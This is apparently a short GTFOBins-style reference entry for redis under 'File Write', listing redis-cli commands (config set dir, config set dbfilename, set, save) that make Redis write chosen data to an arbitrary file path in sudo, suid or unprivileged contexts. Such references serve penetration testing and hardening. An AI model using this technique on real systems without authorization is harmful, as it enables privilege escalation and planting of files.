title: redis
html:
redis

File Write

Context: sudo, suid, unprivileged

redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x "DATA"
save
excerpt: redis File Write Context: sudo, suid, unprivileged redis-cli -h 127.0.0.1 config set dir /path/to/output-dir/ config set dbfilename output-file set x "DATA" save
